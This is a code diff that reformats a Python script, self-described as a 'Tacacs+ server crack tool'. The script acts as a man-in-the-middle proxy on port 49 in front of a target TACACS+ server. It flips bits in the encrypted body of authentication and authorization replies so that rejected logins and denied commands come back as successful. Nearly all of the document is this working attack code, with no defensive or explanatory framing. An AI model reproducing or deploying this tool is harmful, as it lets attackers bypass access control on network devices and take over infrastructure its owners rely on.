@@ -1,20 +1,28 @@
 #!/usr/bin/python
-import socket
-import select
-import time
-import sys
 import argparse
+import select
+import socket
+import sys
+import time
 
 buffer_size = 4096
 delay = 0.0001
 
+
 def parse_args():
-    parser = argparse.ArgumentParser(
-        description="  Tacacs+ server crack tool")
+    parser = argparse.ArgumentParser(description="  Tacacs+ server crack tool")
     parser.add_argument(
-        '-t', '--target', type=str, help=' Tacacs+ server host address', required=True)
+        "-t", "--target", type=str, help=" Tacacs+ server host address", required=True
+    )
     parser.add_argument(
-        '-v', '--verbose', help='Verbose mode', action="store_true", dest="verbose", default=False, required=False)
+        "-v",
+        "--verbose",
+        help="Verbose mode",
+        action="store_true",
+        dest="verbose",
+        default=False,
+        required=False,
+    )
     args = parser.parse_args()
     return args.target, args.verbose
 
@@ -27,7 +35,7 @@ class Forward:
         try:
             self.forward.connect((host, port))
             if verbose:
-                print("Connected to {}:{}".format(ip,49))
+                print("Connected to {}:{}".format(ip, 49))
             return self.forward
         except Exception as e:
             print(e)
@@ -44,7 +52,7 @@ class TheServer:
         self.server.bind((host, port))
         self.server.listen(200)
         if verbose:
-            print("Listening on {}:{}".format(host,port))
+            print("Listening on {}:{}".format(host, port))
 
     def main_loop(self):
         self.input_list.append(self.server)
@@ -77,14 +85,14 @@ class TheServer:
         forward = Forward().start(forward_to[0], forward_to[1])
         clientsock, clientaddr = self.server.accept()
         if forward:
-            print(clientaddr+" has connected")
+            print(clientaddr + " has connected")
             self.input_list.append(clientsock)
             self.input_list.append(forward)
             self.channel[clientsock] = forward
             self.channel[forward] = clientsock
         else:
             print("connot connect to server.")
-            print("now close socket"+ clientaddr)
+            print("now close socket" + clientaddr)
             clientsock.close()
 
     def on_close(self):
@@ -115,34 +123,34 @@ class TheServer:
         verb("Packet type: ", p_type)
         verb("Packet number: ", seq_num)
         verb("Session id: ", ses_id)
-        length = int(data[8:12].encode('hex'), 16)
+        length = int(data[8:12].encode("hex"), 16)
         verb("Packet length: ", str(length))
 
-        enc_data = data[12:12 + length]
+        enc_data = data[12 : 12 + length]
         verb("Encrypted data: ", enc_data)
 
-        if (p_type == "\x01"):
+        if p_type == "\x01":
             print("Authentication packet")
-            if (seq_num == "\x04"):
+            if seq_num == "\x04":
                 print("Bit flip for a good authentication")
-                pseudo_pad = int(data[12].encode('hex'), 16) ^ 0x02
+                pseudo_pad = int(data[12].encode("hex"), 16) ^ 0x02
                 verb("pseudo_pad:", str(pseudo_pad))
                 new_pseudo_pad = pseudo_pad ^ 0x01
                 verb("new_pseudo_pad: ", str(new_pseudo_pad))
                 data = data[:12] + chr(new_pseudo_pad) + data[13:]
                 verb("data: ", data)
-        elif (p_type == "\x02"):
+        elif p_type == "\x02":
             print("Authorization packet")
-            if (seq_num == "\x02"):
+            if seq_num == "\x02":
                 print("Bit flip for a good authorization")
-                pseudo_pad = int(data[12].encode('hex'), 16) ^ 0x10
+                pseudo_pad = int(data[12].encode("hex"), 16) ^ 0x10
                 verb("pseudo_pad:", str(pseudo_pad))
                 new_pseudo_pad = pseudo_pad ^ 0x01
                 verb("new_pseudo_pad: ", str(new_pseudo_pad))
                 data = data[:12] + chr(new_pseudo_pad) + data[13:]
                 verb("data: ", data)
 
-        elif (p_type == "\x03"):
+        elif p_type == "\x03":
             print("Accounting")
         else:
             verb("A strange packet type!")
@@ -152,14 +160,14 @@ class TheServer:
 def verb(desc, val=""):
     #
     if verbose:
-        print(desc + val.encode('hex'))
+        print(desc + val.encode("hex"))
 
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     ip, verbose = parse_args()
     forward_to = (ip, 49)
-    
-    server = TheServer('', 49)
+
+    server = TheServer("", 49)
     try:
         server.main_loop()
     except KeyboardInterrupt:
